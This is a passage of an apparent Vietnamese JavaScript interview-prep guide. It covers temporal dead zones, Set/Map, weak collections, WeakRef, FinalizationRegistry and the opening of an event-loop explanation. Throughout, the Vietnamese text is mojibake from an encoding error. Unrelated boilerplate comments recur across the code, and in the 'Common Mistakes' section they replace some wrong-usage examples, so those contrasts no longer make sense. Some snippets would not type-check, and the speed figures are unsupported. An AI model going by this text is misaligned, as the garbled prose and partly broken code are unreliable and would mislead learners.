 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
  let value = 10;
}

// ‚úÖ Fix: Khai b√°o tr∆∞·ªõc khi d√πng
{
  let value = 10;
  console.log(value); // Ch√∫ gi·∫£i: ‚úÖ 10
}
```

**So S√°nh:**

| Feature | var | let/const |
|---------|-----|-----------|
| Hoisted? | ‚úÖ C√≥ | ‚úÖ C√≥ |
| Initialized? | ‚úÖ undefined | ‚ùå Kh√¥ng |
| TDZ? | ‚ùå Kh√¥ng | ‚úÖ C√≥ |
| Access tr∆∞·ªõc khai b√°o | undefined | ReferenceError |
| Scope | Function | Block |

**üí° Key Takeaways:**

- **var**: Hoisted + undefined ‚Üí access tr∆∞·ªõc OK (nh∆∞ng undefined)
- **let/const**: Hoisted ‚Üí TDZ ‚Üí ReferenceError n·∫øu access tr∆∞·ªõc
- **function declaration**: Hoisted ho√†n to√†n ‚Üí g·ªçi tr∆∞·ªõc OK
- **TDZ**: T·ª´ ƒë·∫ßu scope ƒë·∫øn d√≤ng khai b√°o - bi·∫øn t·ªìn t·∫°i nh∆∞ng kh√¥ng access ƒë∆∞·ª£c
- **typeof kh√¥ng safe** trong TDZ!
- **Lu√¥n d√πng const/let**, tr√°nh var
---
## 05. üóÇÔ∏è Q05: Set/Map, WeakSet/WeakMap, WeakRef & FinalizationRegistry - Collections & Weak References  

**P1: T√™n c√¢u h·ªèi:** üóÇÔ∏è Q05: Set/Map, WeakSet/WeakMap, WeakRef & FinalizationRegistry - Collections & Weak References  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Set/Map l√† collections n√¢ng cao c·ªßa JavaScript, c√≤n WeakSet/WeakMap/WeakRef l√† phi√™n b·∫£n weak reference kh√¥ng ngƒÉn garbage collection."**

**üîë 4 ƒêi·ªÉm Ch√≠nh:**

**1. Set vs Array:**
- Set l∆∞u **unique values**, t·ª± ƒë·ªông lo·∫°i duplicate
- Performance O(1) cho `.has()`, `.add()`, `.delete()` (Array l√† O(n))
- Use case: deduplicate array `[...new Set([1,2,2,3])]`, check membership nhanh

**2. Map vs Object:**
- Map keys c√≥ th·ªÉ l√† **b·∫•t k·ª≥ type n√†o** (object, function, primitive) - Object ch·ªâ d√πng string/symbol
- **Maintain insertion order** v√† c√≥ `.size` property
- Use case: cache v·ªõi object keys, counting occurrences, ordered data

**3. WeakMap/WeakSet - Weak References:**
- Keys ph·∫£i l√† **objects**, kh√¥ng prevent garbage collection
- **Kh√¥ng iterable**, kh√¥ng c√≥ `.size` - v√¨ entries c√≥ th·ªÉ bi·∫øn m·∫•t b·∫•t c·ª© l√∫c n√†o
- Use case: **private data** (WeakMap), metadata cho DOM nodes, preventing memory leaks

**4. WeakRef & FinalizationRegistry:**
- WeakRef: t·∫°o weak reference t·ªõi 1 object c·ª• th·ªÉ, c√≥ th·ªÉ b·ªã GC
- FinalizationRegistry: callback khi object b·ªã GC ƒë·ªÉ cleanup resources
- **‚ö†Ô∏è Non-deterministic** - kh√¥ng d√πng cho core logic

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- D√πng Object khi c·∫ßn Map ‚Üí kh√¥ng maintain order, keys b·ªã convert sang string
- D√πng WeakMap v·ªõi primitive keys ‚Üí Error (ph·∫£i d√πng objects)
- Expect WeakRef.deref() lu√¥n return object ‚Üí c√≥ th·ªÉ return `undefined` n·∫øu ƒë√£ GC

**üí° Ki·∫øn Th·ª©c Senior:**
- WeakMap d√πng cho **private properties pattern** tr∆∞·ªõc khi c√≥ `#privateField`
- Set/Map internally d√πng **SameValueZero algorithm** (nh∆∞ `===` nh∆∞ng `NaN === NaN`)
- WeakMap **kh√¥ng c√≥ memory leak** khi attach metadata v√†o DOM nodes (auto cleanup khi node removed)
- FinalizationRegistry ch·ªâ d√πng cho **cleanup non-JS resources** (file handles, WASM memory), kh√¥ng d√πng cho app logic




**‚ö° Quick Summary:**
> **Set** = unique values, **Map** = key-value (any type). **Weak** = kh√¥ng prevent GC, keys ph·∫£i l√† objects

**üí° Ghi Nh·ªõ:**
- üéØ **Set**: Array nh∆∞ng unique, `.add()`, `.has()`, `.delete()`
- üì¶ **Map**: Object nh∆∞ng keys c√≥ th·ªÉ l√† any type (object, function...), maintain insertion order
- üî• **WeakSet/WeakMap**: Keys l√† objects, t·ª± ƒë·ªông GC khi kh√¥ng c√≤n reference
- ‚ö° **Use Cases**: Set = dedupe, Map = cache, WeakMap = private data

**Tr·∫£ l·ªùi:**

**üéØ Core Concepts:**

- **Set**: Collection c·ªßa unique values, kh√¥ng c√≥ keys, c√≥ th·ªÉ iterate
- **Map**: Collection c·ªßa key-value pairs, keys c√≥ th·ªÉ l√† b·∫•t k·ª≥ type n√†o (objects, functions, primitives)
- **WeakSet/WeakMap**: Weak references ƒë·∫øn objects, kh√¥ng prevent garbage collection, kh√¥ng iterable
- **WeakRef**: T·∫°o weak reference ƒë·∫øn m·ªôt object c·ª• th·ªÉ, object c√≥ th·ªÉ b·ªã GC b·∫•t c·ª© l√∫c n√†o
- **FinalizationRegistry**: ƒêƒÉng k√Ω callback cleanup khi object ƒë∆∞·ª£c garbage collected

**‚úÖ ∆Øu ƒëi·ªÉm:**

- Set/Map: Performance t·ªët h∆°n Object cho lookups, iteration, v√† unique values
- WeakSet/WeakMap: T·ª± ƒë·ªông cleanup, tr√°nh memory leaks
- WeakRef: Cho ph√©p t·∫°o caches m√† kh√¥ng prevent GC
- FinalizationRegistry: Cleanup resources (file handles, database connections) khi objects die

**‚ö†Ô∏è Nh∆∞·ª£c ƒëi·ªÉm:**

- WeakSet/WeakMap: Kh√¥ng iterable, kh√¥ng c√≥ size property, keys ph·∫£i l√† objects
- WeakRef: Non-deterministic (kh√¥ng bi·∫øt khi n√†o object b·ªã GC), kh√¥ng n√™n d√πng cho core logic
- FinalizationRegistry: Callback c√≥ th·ªÉ ch·∫°y mu·ªôn ho·∫∑c kh√¥ng ch·∫°y, kh√¥ng predictable

**Code Example:**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 1. SET - Collection Unique Values
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - Set l∆∞u tr·ªØ unique values (kh√¥ng duplicate)
 * - C√≥ th·ªÉ iterate qua c√°c values
 * - Performance O(1) cho add, delete, has operations
 */
let numberSet: Set<number> = new Set([1, 2, 3, 3, 4]);
console.log(numberSet); // Ch√∫ gi·∫£i: Set(4) {1, 2, 3, 4} - duplicate removed

numberSet.add(5);
numberSet.delete(1);
console.log(numberSet.has(2)); // Ch√∫ gi·∫£i: true
console.log(numberSet.size); // Ch√∫ gi·∫£i: 4

 // Ch√∫ gi·∫£i: Iterate Set
for (let value of numberSet) {
  console.log(value); // Ch√∫ gi·∫£i: 2, 3, 4, 5
}

 // Ch√∫ gi·∫£i: Use cases cho Set
 // Ch√∫ gi·∫£i: 1. Remove duplicates t·ª´ array
const numbers = [1, 2, 2, 3, 3, 4, 5, 5];
const uniqueNumbers = [...new Set(numbers)]; // Ch√∫ gi·∫£i: [1, 2, 3, 4, 5]

 // Ch√∫ gi·∫£i: 2. Check membership (nhanh h∆°n array.includes)
const validIds = new Set([1, 5, 10, 15]);
console.log(validIds.has(5)); // Ch√∫ gi·∫£i: true - O(1) time

 // Ch√∫ gi·∫£i: 3. Set operations
const setA = new Set([1, 2, 3, 4]);
const setB = new Set([3, 4, 5, 6]);

 // Ch√∫ gi·∫£i: Union (h·ª£p)
const union = new Set([...setA, ...setB]); // Ch√∫ gi·∫£i: {1, 2, 3, 4, 5, 6}

 // Ch√∫ gi·∫£i: Intersection (giao)
const intersection = new Set([...setA].filter((x) => setB.has(x))); // Ch√∫ gi·∫£i: {3, 4}

// Difference (hi·ªáu)
const difference = new Set([...setA].filter((x) => !setB.has(x))); // Ch√∫ gi·∫£i: {1, 2}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 2. MAP - Key-Value Pairs v·ªõi Any Type Keys
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - Map cho ph√©p keys l√† B·∫§T K·ª≤ TYPE N√ÄO (objects, functions, primitives)
 * - Object ch·ªâ cho ph√©p string/symbol keys
 * - Map gi·ªØ insertion order
 * - Performance t·ªët h∆°n Object cho frequent additions/deletions
 */
let userMap: Map<string, { name: string; age: number }> = new Map();
userMap.set('user1', { name: 'John', age: 25 });
userMap.set('user2', { name: 'Jane', age: 30 });

console.log(userMap.get('user1')); // Ch√∫ gi·∫£i: {name: "John", age: 25}
console.log(userMap.has('user1')); // Ch√∫ gi·∫£i: true
console.log(userMap.size); // Ch√∫ gi·∫£i: 2

 // Ch√∫ gi·∫£i: Iterate Map
for (let [key, value] of userMap) {
  console.log(`${key}: ${value.name}`);
}

 // Ch√∫ gi·∫£i: Map vs Object - Key Types
let obj: { [key: string]: any } = {};
obj[1] = 'one'; // Ch√∫ gi·∫£i: key becomes STRING "1"
obj[true] = 'true'; // Ch√∫ gi·∫£i: key becomes STRING "true"
console.log(Object.keys(obj)); // Ch√∫ gi·∫£i: ["1", "true"]

let map = new Map();
map.set(1, 'one'); // Ch√∫ gi·∫£i: key is NUMBER 1
map.set(true, 'true'); // Ch√∫ gi·∫£i: key is BOOLEAN true
map.set({ id: 1 }, 'object key'); // Ch√∫ gi·∫£i: key is OBJECT

console.log(map.get(1)); // Ch√∫ gi·∫£i: "one"
console.log(map.get(true)); // Ch√∫ gi·∫£i: "true"

 // Ch√∫ gi·∫£i: Use cases cho Map
 // Ch√∫ gi·∫£i: 1. Metadata storage v·ªõi object keys
const metadataMap = new Map<object, { createdAt: Date; author: string }>();
const element = document.querySelector('.btn');
metadataMap.set(element, {
  createdAt: new Date(),
  author: 'John',
});

 // Ch√∫ gi·∫£i: 2. Cache v·ªõi function keys
const memoCache = new Map<Function, any>();
function expensiveOperation(fn: Function) {
  if (memoCache.has(fn)) {
    return memoCache.get(fn);
  }
  const result = fn();
  memoCache.set(fn, result);
  return result;
}

 // Ch√∫ gi·∫£i: 3. Counting occurrences
const wordCount = new Map<string, number>();
const words = ['apple', 'banana', 'apple', 'cherry', 'banana', 'apple'];
words.forEach((word) => {
  wordCount.set(word, (wordCount.get(word) || 0) + 1);
});
console.log(wordCount); // Ch√∫ gi·∫£i: Map { "apple" => 3, "banana" => 2, "cherry" => 1 }

 // Ch√∫ gi·∫£i: ============================================
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object. `WeakMap`/`WeakSet` gi·ªØ tham chi·∫øu y·∫øu: kh√¥ng ngƒÉn ƒë·ªëi t∆∞·ª£ng b·ªã thu gom r√°c khi kh√¥ng c√≤n tham chi·∫øu m·∫°nh, h·ªØu √≠ch cho cache kh√¥ng c·ªë ƒë·ªãnh.
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - WeakSet ch·ªâ ch·ª©a objects (kh√¥ng ch·ª©a primitives)
 * - Weak reference: kh√¥ng prevent garbage collection
 * - Kh√¥ng iterable, kh√¥ng c√≥ size, kh√¥ng c√≥ clear()
 * - Use case: Track objects m√† kh√¥ng prevent ch√∫ng b·ªã GC
 */
let weakSet: WeakSet<object> = new WeakSet();
let obj1: any = { name: 'A' };
let obj2: any = { name: 'B' };

weakSet.add(obj1);
weakSet.add(obj2);
console.log(weakSet.has(obj1)); // Ch√∫ gi·∫£i: true

obj1 = null; // obj1 c√≥ th·ªÉ b·ªã garbage collected ngay
// weakSet KH√îNG prevent obj1 kh·ªèi b·ªã GC

// Use case: Track DOM elements m√† kh√¥ng prevent cleanup
class DOMElementTracker {
  private processedElements = new WeakSet<HTMLElement>();

  markAsProcessed(element: HTMLElement): void {
    this.processedElements.add(element);
  }

  isProcessed(element: HTMLElement): boolean {
    return this.processedElements.has(element);
  }

  // Khi element removed kh·ªèi DOM v√† kh√¥ng c√≤n references,
  // n√≥ s·∫Ω t·ª± ƒë·ªông removed kh·ªèi WeakSet qua GC
}

 // Ch√∫ gi·∫£i: ============================================
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object. `WeakMap`/`WeakSet` gi·ªØ tham chi·∫øu y·∫øu: kh√¥ng ngƒÉn ƒë·ªëi t∆∞·ª£ng b·ªã thu gom r√°c khi kh√¥ng c√≤n tham chi·∫øu m·∫°nh, h·ªØu √≠ch cho cache kh√¥ng c·ªë ƒë·ªãnh.
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - WeakMap keys PH·∫¢I l√† objects (kh√¥ng ph·∫£i primitives)
 * - Keys l√† weak references - kh√¥ng prevent GC
 * - Kh√¥ng iterable, kh√¥ng c√≥ size
 * - Use case: Private data, metadata cho objects
 */
let weakMap: WeakMap<object, string> = new WeakMap();
let keyObj: any = { id: 1 };
weakMap.set(keyObj, 'value');
console.log(weakMap.get(keyObj)); // Ch√∫ gi·∫£i: "value"

keyObj = null; // keyObj c√≥ th·ªÉ b·ªã GC, entry t·ª± ƒë·ªông removed

 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
const privateData = new WeakMap<object, { password: string }>();

class User {
  constructor(public username: string, password: string) {
 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
    privateData.set(this, { password });
  }

  checkPassword(input: string): boolean {
    const data = privateData.get(this);
    return data?.password === input;
  }
}

const user = new User('john', 'secret123');
console.log(user.checkPassword('secret123')); // Ch√∫ gi·∫£i: true
// Kh√¥ng th·ªÉ access password t·ª´ b√™n ngo√†i

 // Ch√∫ gi·∫£i: Use case 2: Metadata cho DOM elements
const elementMetadata = new WeakMap<HTMLElement, { clicks: number; lastClicked: Date }>();

function trackClicks(element: HTMLElement): void {
  const metadata = elementMetadata.get(element) || { clicks: 0, lastClicked: new Date() };
  metadata.clicks++;
  metadata.lastClicked = new Date();
  elementMetadata.set(element, metadata);
}

// Khi element removed kh·ªèi DOM, metadata t·ª± ƒë·ªông cleaned up

 // Ch√∫ gi·∫£i: Use case 3: Cache cho object methods
const resultCache = new WeakMap<object, Map<string, any>>();

function memoize(obj: any, methodName: string, fn: Function) {
  if (!resultCache.has(obj)) {
    resultCache.set(obj, new Map());
  }

  const cache = resultCache.get(obj)!;
  const key = JSON.stringify(arguments);

  if (cache.has(key)) {
    return cache.get(key);
  }

  const result = fn();
  cache.set(key, result);
  return result;
}

 // Ch√∫ gi·∫£i: ============================================
// 5. WEAKREF - Weak Reference ƒë·∫øn Single Object
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - WeakRef cho ph√©p hold weak reference ƒë·∫øn m·ªôt object
 * - Object c√≥ th·ªÉ b·ªã GC b·∫•t c·ª© l√∫c n√†o
 * - D√πng deref() ƒë·ªÉ get object (c√≥ th·ªÉ return undefined n·∫øu ƒë√£ GC)
 * - KH√îNG d√πng cho core logic v√¨ non-deterministic
 * - Use case: Caches, observer patterns
 */
let targetObj: any = { x: 1, data: 'important' };
const weakRef = new WeakRef(targetObj);

 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
console.log(weakRef.deref()?.x); // Ch√∫ gi·∫£i: 1

 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
targetObj = null;

// Object c√≥ th·ªÉ b·ªã GC, deref() c√≥ th·ªÉ return undefined
setTimeout(() => {
  const obj = weakRef.deref();
  if (obj) {
    console.log('Object still alive:', obj.x);
  } else {
    console.log('Object was garbage collected');
  }
}, 1000);

 // Ch√∫ gi·∫£i: Use case: Image cache v·ªõi automatic cleanup
class ImageCache {
  private cache = new Map<string, WeakRef<HTMLImageElement>>();

  set(url: string, image: HTMLImageElement): void {
    this.cache.set(url, new WeakRef(image));
  }

  get(url: string): HTMLImageElement | undefined {
    const ref = this.cache.get(url);
    if (!ref) return undefined;

    const image = ref.deref();
    if (!image) {
 // Thu gom r√°c t·ª± ƒë·ªông: runtime ƒë√°nh d·∫•u v√† qu√©t c√°c object kh√¥ng c√≤n truy c·∫≠p ƒë·ªÉ gi·∫£i ph√≥ng b·ªô nh·ªõ.
      this.cache.delete(url);
      return undefined;
    }

    return image;
  }
}

const imageCache = new ImageCache();

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 6. FINALIZATIONREGISTRY - Cleanup Callback khi Object Dies
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * - FinalizationRegistry cho ph√©p ƒëƒÉng k√Ω callback khi object ƒë∆∞·ª£c GC
 * - Callback nh·∫≠n "held value" (metadata) kh√¥ng ph·∫£i object itself
 * - KH√îNG reliable - callback c√≥ th·ªÉ ch·∫°y mu·ªôn ho·∫∑c kh√¥ng ch·∫°y
 * - Use case: Cleanup external resources (files, connections, timers)
 */
const registry = new FinalizationRegistry<string>((heldValue) => {
  console.log(`Object ${heldValue} was garbage collected`);
 // Ch√∫ gi·∫£i: Cleanup external resources here
 // Ch√∫ gi·∫£i: e.g., close file handles, database connections, etc.
});

let myObj: any = { x: 1 };
 // Ch√∫ gi·∫£i: Register object v·ªõi held value "my-obj"
registry.register(myObj, 'my-obj');

myObj = null; // Object c√≥ th·ªÉ b·ªã GC sau ƒë√≥
// Callback s·∫Ω ch·∫°y: "Object my-obj was garbage collected"

 // Ch√∫ gi·∫£i: Use case: Resource cleanup
class FileHandle {
  private static registry = new FinalizationRegistry<number>((fileDescriptor) => {
    console.log(`Closing file descriptor ${fileDescriptor}`);
 // Ch√∫ gi·∫£i: Close actual file handle
 // Ch√∫ gi·∫£i: closeFile(fileDescriptor);
  });

  constructor(private fd: number) {
 // Ch√∫ gi·∫£i: Register for cleanup
    FileHandle.registry.register(this, fd);
  }

  read(): string {
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
    return 'file content';
  }
}

 // Ch√∫ gi·∫£i: Use case: Database connection pool
class DatabaseConnection {
  private static registry = new FinalizationRegistry<string>((connectionId) => {
    console.log(`Cleanup connection ${connectionId}`);
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
  });

  constructor(private id: string) {
    DatabaseConnection.registry.register(this, id);
  }
}

 // Ch√∫ gi·∫£i: Use case: Timer cleanup
const timerRegistry = new FinalizationRegistry<number>((timerId) => {
  console.log(`Clearing timer ${timerId}`);
  clearInterval(timerId);
});

class AutoTimer {
  private timerId: number;

  constructor(callback: () => void, interval: number) {
    this.timerId = window.setInterval(callback, interval);
    timerRegistry.register(this, this.timerId);
  }
}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 7. PRACTICAL COMPARISON - When to Use What
 // Ch√∫ gi·∫£i: ============================================
/**
 * Vietnamese Explanation:
 * 
 * Use SET when:
 * - C·∫ßn unique values
 * - C·∫ßn check membership nhanh (O(1))
 * - C·∫ßn set operations (union, intersection)
 * 
 * Use MAP when:
 * - C·∫ßn key-value pairs v·ªõi non-string keys
 * - C·∫ßn preserve insertion order
 * - Frequent additions/deletions
 * 
 * Use WEAKSET when:
 * - Track objects m√† kh√¥ng prevent GC
 * - Mark/tag objects temporarily
 * 
 * Use WEAKMAP when:
 * - Private data cho objects
 * - Metadata/cache cho objects
 * - Automatic cleanup when objects die
 * 
 * Use WEAKREF when:
 * - Caches c√≥ th·ªÉ expire
 * - Observer patterns
 * - Kh√¥ng c·∫ßn guarantee object availability
 * 
 * Use FINALIZATIONREGISTRY when:
 * - Cleanup external resources
 * - Close file handles, connections
 * - NOT for critical logic (unreliable timing)
 */

 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
console.time('Set operations');
const set = new Set();
for (let i = 0; i < 100000; i++) {
  set.add(i);
}
console.timeEnd('Set operations'); // Ch√∫ gi·∫£i: ~5ms

console.time('Object operations');
const obj = {};
for (let i = 0; i < 100000; i++) {
  obj[i] = true;
}
console.timeEnd('Object operations'); // Ch√∫ gi·∫£i: ~8ms

console.time('Map operations');
const map = new Map();
for (let i = 0; i < 100000; i++) {
  map.set(i, true);
}
console.timeEnd('Map operations'); // Ch√∫ gi·∫£i: ~6ms
```

**üéØ Best Practices:**

1. **Set**: S·ª≠ d·ª•ng cho unique values, remove duplicates, membership checks
2. **Map**: S·ª≠ d·ª•ng cho key-value pairs v·ªõi non-string keys, preserve insertion order
3. **WeakSet**: Track objects temporarily m√† kh√¥ng prevent GC (DOM elements, event handlers)
4. **WeakMap**: Private properties, metadata, caches for objects
5. **WeakRef**: Soft caches m√† kh√¥ng prevent GC, lu√¥n c√≥ fallback khi deref() returns undefined
6. **FinalizationRegistry**: Cleanup external resources (files, connections), KH√îNG d√πng cho critical logic
7. **Map vs Object**: Prefer Map khi c·∫ßn frequent additions/deletions ho·∫∑c non-string keys
8. **WeakMap for Privacy**: Use WeakMap ƒë·ªÉ implement private properties trong classes

**‚ö†Ô∏è Common Mistakes:**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå Sai: S·ª≠ d·ª•ng Object cho unique values
let uniqueValues: { [key: string]: boolean } = {};
uniqueValues['a'] = true;
uniqueValues['b'] = true;
uniqueValues['a'] = true; // Duplicate, nh∆∞ng kh√¥ng b·ªã detect
console.log(Object.keys(uniqueValues).length); // Ch√∫ gi·∫£i: 2 (ph·∫£i manually check)

// ‚úÖ ƒê√∫ng: S·ª≠ d·ª•ng Set
let uniqueValues2 = new Set(['a', 'b', 'a']); // Ch√∫ gi·∫£i: Set(2) {"a", "b"}
console.log(uniqueValues2.size); // Ch√∫ gi·∫£i: 2 (automatic)

 // `WeakMap`/`WeakSet` gi·ªØ tham chi·∫øu y·∫øu: kh√¥ng ngƒÉn ƒë·ªëi t∆∞·ª£ng b·ªã thu gom r√°c khi kh√¥ng c√≤n tham chi·∫øu m·∫°nh, h·ªØu √≠ch cho cache kh√¥ng c·ªë ƒë·ªãnh.
const weakSet = new WeakSet();
 // `WeakMap`/`WeakSet` gi·ªØ tham chi·∫øu y·∫øu: kh√¥ng ngƒÉn ƒë·ªëi t∆∞·ª£ng b·ªã thu gom r√°c khi kh√¥ng c√≤n tham chi·∫øu m·∫°nh, h·ªØu √≠ch cho cache kh√¥ng c·ªë ƒë·ªãnh.

// ‚úÖ ƒê√∫ng: WeakSet ch·ªâ v·ªõi objects
const weakSet2 = new WeakSet();
weakSet2.add({ id: 1 }); // Ch√∫ gi·∫£i: OK

 // `WeakMap`/`WeakSet` gi·ªØ tham chi·∫øu y·∫øu: kh√¥ng ngƒÉn ƒë·ªëi t∆∞·ª£ng b·ªã thu gom r√°c khi kh√¥ng c√≤n tham chi·∫øu m·∫°nh, h·ªØu √≠ch cho cache kh√¥ng c·ªë ƒë·ªãnh.
const weakMap = new WeakMap();
 // `WeakMap`/`WeakSet` gi·ªØ tham chi·∫øu y·∫øu: kh√¥ng ngƒÉn ƒë·ªëi t∆∞·ª£ng b·ªã thu gom r√°c khi kh√¥ng c√≤n tham chi·∫øu m·∫°nh, h·ªØu √≠ch cho cache kh√¥ng c·ªë ƒë·ªãnh.

// ‚úÖ ƒê√∫ng: WeakMap kh√¥ng iterable, ch·ªâ get/set/has/delete
weakMap.get(someKey);

// ‚ùå Sai: D·ª±a v√†o WeakRef cho critical logic
function getCachedData(key: string) {
  const ref = cache.get(key);
  return ref.deref().data; // Error n·∫øu object ƒë√£ GC!
}

// ‚úÖ ƒê√∫ng: Always check deref() result
function getCachedData2(key: string) {
  const ref = cache.get(key);
  const obj = ref?.deref();
  if (obj) {
    return obj.data;
  }
 // Ch√∫ gi·∫£i: Fallback: fetch fresh data
  return fetchData(key);
}

 // Ch√∫ gi·∫£i: ‚ùå Sai: Expect FinalizationRegistry callback ch·∫°y ngay
registry.register(obj, 'data');
obj = null;
// Callback KH√îNG ch·∫°y ngay l·∫≠p t·ª©c!

// ‚úÖ ƒê√∫ng: FinalizationRegistry cho optional cleanup only
// Kh√¥ng rely on timing, c√≥ backup cleanup mechanism
```

**üìä Performance & Memory Considerations:**

- **Set/Map**: ~2-3x faster than Object cho frequent lookups/additions/deletions
- **WeakSet/WeakMap**: Nh·ªè h∆°n v·ªÅ memory v√¨ automatic cleanup
- **WeakRef**: Minimal memory overhead, nh∆∞ng c√≥ CPU cost cho deref() checks
- **FinalizationRegistry**: Minimal overhead, callback ch·∫°y async trong idle time
---
## 06. üîÑ Q06: Event Loop - C∆° Ch·∫ø Ho·∫°t ƒê·ªông JavaScript (Technical Deep Dive)  

**P1: T√™n c√¢u h·ªèi:** üîÑ Q06: Event Loop - C∆° Ch·∫ø Ho·∫°t ƒê·ªông JavaScript (Technical Deep Dive)  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"JavaScript ch·∫°y ƒë∆°n lu·ªìng v·ªõi Event Loop ƒë·ªÉ x·ª≠ l√Ω c√°c thao t√°c b·∫•t ƒë·ªìng b·ªô.**

**üèóÔ∏è Ki·∫øn Tr√∫c (5 Th√†nh Ph·∫ßn):**
1. **Call Stack (NgƒÉn x·∫øp g·ªçi - LIFO)**: N∆°i th·ª±c thi code ƒë·ªìng b·ªô. ƒê∆°n lu·ªìng ‚Üí ch·ªâ 1 h√†m ch·∫°y t·∫°i 1 th·ªùi ƒëi·ªÉm.
2. **Heap (V√πng nh·ªõ)**: C·∫•p ph√°t b·ªô nh·ªõ cho objects, arrays, functions.
3. **Web APIs (Tr√¨nh duy·ªát) / C++ APIs (Node.js)**: X·ª≠ l√Ω thao t√°c b·∫•t ƒë·ªìng b·ªô (setTimeout, fetch, fs.readFile) ‚Üí ch·∫°y tr√™n lu·ªìng ri√™ng.
4. **Microtask Queue (H√†ng ƒë·ª£i ∆∞u ti√™n cao)**: Promise callbacks, queueMicrotask, MutationObserver.
5. **Macrotask Queue (H√†ng ƒë·ª£i ∆∞u ti√™n th·∫•p)**: setTimeout, setInterval, I/O, UI rendering.

**‚ôªÔ∏è Lu·ªìng Ho·∫°t ƒê·ªông Event Loop (Chi Ti·∫øt):**
```
while (true) {
  1. Th·ª±c thi T·∫§T C·∫¢ code ƒë·ªìng b·ªô trong Call Stack (cho ƒë·∫øn khi tr·ªëng)
  2. Th·ª±c thi T·∫§T C·∫¢ Microtasks (Promise.then, queueMicrotask)
     ‚Üí L√†m tr·ªëng ho√†n to√†n Microtask Queue
  3. Render UI (Ch·ªâ tr√¨nh duy·ªát - 60fps = 16ms/frame)
  4. Th·ª±c thi M·ªòT Macrotask (setTimeout callback)
  5. Quay l·∫°i b∆∞·ªõc 2 (ki·ªÉm tra Microtasks l·∫°i)
}
```

**üîë ƒêi·ªÉm Kh√°c Bi·ªát Quan Tr·ªçng:**
- **Microtask vs Macrotask**:
  - Microtask ch·∫°y T·∫§T C·∫¢ tr∆∞·ªõc khi Event Loop ti·∫øp t·ª•c.
  - Macrotask ch·ªâ ch·∫°y 1 task m·ªói v√≤ng l·∫∑p.
  - ∆Øu ti√™n: Microtask > UI Render > Macrotask.
- **Tr√¨nh duy·ªát vs Node.js**:
  - Tr√¨nh duy·ªát: C√≥ giai ƒëo·∫°n render UI.
  - Node.js: C√≥ `process.nextTick()` (∆∞u ti√™n cao h∆°n Microtask) + 6 giai ƒëo·∫°n (timers, I/O, idle, poll, check, close).

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- **L√†m ƒë√≥i UI**: Microtasks v√¥ h·∫°n ch·∫∑n rendering ‚Üí UI ƒë√≥ng bƒÉng.
  ```js
  function loop() {
    Promise.resolve().then(loop); // ‚ùå Ch·∫∑n UI m√£i m√£i
  }
  ```
- **setTimeout(fn, 0) ‚â† T·ª©c th√¨**: V·∫´n ph·∫£i ch·ªù Call Stack tr·ªëng + Microtasks ho√†n th√†nh.
- **Race Conditions**: Callbacks b·∫•t ƒë·ªìng b·ªô c√≥ th·ªÉ th·ª±c thi kh√¥ng theo th·ª© t·ª± mong ƒë·ª£i.

**üéØ V√≠ D·ª• Th·ª±c T·∫ø:**
```js
console.log('1'); // ƒê·ªìng b·ªô ‚Üí Call Stack
setTimeout(() => console.log('2'), 0); // Ch√∫ gi·∫£i: Macrotask Queue
